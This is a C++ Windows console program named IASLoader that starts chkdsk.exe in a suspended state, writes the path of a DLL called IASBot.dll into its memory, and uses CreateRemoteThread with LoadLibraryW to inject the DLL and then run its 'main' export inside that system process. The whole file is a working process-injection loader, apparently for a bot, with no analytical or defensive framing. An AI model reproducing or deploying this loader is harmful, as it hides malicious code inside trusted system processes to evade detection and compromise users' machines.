// IASLoader.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>
#include "Shlwapi.h"
#pragma comment(lib, "Shlwapi.lib")

int _tmain(int argc, _TCHAR* argv[])
{
	HANDLE dllHND = CreateFile(L"IASBot.dll", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
	if (INVALID_HANDLE_VALUE == dllHND)
	{
		MessageBox(NULL, L"Error opening IASBot.dll", L"Error", MB_ICONERROR);
		exit(0);
	}
	DWORD sizeLow, sizeHigh, read;
	sizeLow = GetFileSize(dllHND, &sizeHigh);

	byte *code = (byte*)malloc(sizeof(byte)*sizeLow);
	char *calcPath = (char*)malloc(sizeof(char) * MAX_PATH);
	if (!ReadFile(dllHND, code, sizeLow, &read, NULL))
	{
		MessageBox(NULL, L"Error reading IASBot.dll", L"Error", MB_ICONERROR);
		exit(0);
	}
	if (!GetSystemDirectoryA(calcPath, MAX_PATH))
	{
		calcPath = "C:\\windows\\system32\\chkdsk.exe";
	}
	else
	{
		PathCombineA(calcPath, calcPath, "chkdsk.exe");
	}
	STARTUPINFOA si = { 0 };
	si.cb = sizeof(STARTUPINFOA);
	PROCESS_INFORMATION pi;
	wchar_t *fullPathDll = (wchar_t*)malloc(sizeof(wchar_t)*MAX_PATH);
	GetFullPathName(L"IASBot.dll", MAX_PATH, fullPathDll, NULL);

	CreateProcessA(calcPath, NULL, NULL, NULL, NULL, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	void *alloc = VirtualAllocEx(pi.hProcess, NULL, sizeof(char)*MAX_PATH, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	HANDLE loadLibAddr = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "LoadLibraryW");
	CloseHandle(dllHND);
	if (!WriteProcessMemory(pi.hProcess, alloc, fullPathDll, (wcslen(fullPathDll) * 2) + 1, NULL))
	{
		MessageBox(NULL, L"Error writing to process", L"Error", MB_ICONERROR);
		exit(0);
	}
	HANDLE thread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibAddr, alloc, NULL, NULL);
	if (WaitForSingleObject(thread, 30000) == WAIT_TIMEOUT)
	{
		MessageBox(NULL, L"Error calling export", L"Error", MB_ICONERROR);
		exit(0);
	}
	HANDLE main = GetProcAddress(LoadLibrary(fullPathDll), "main");
	CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)main, NULL, NULL, NULL);
	return 0;
}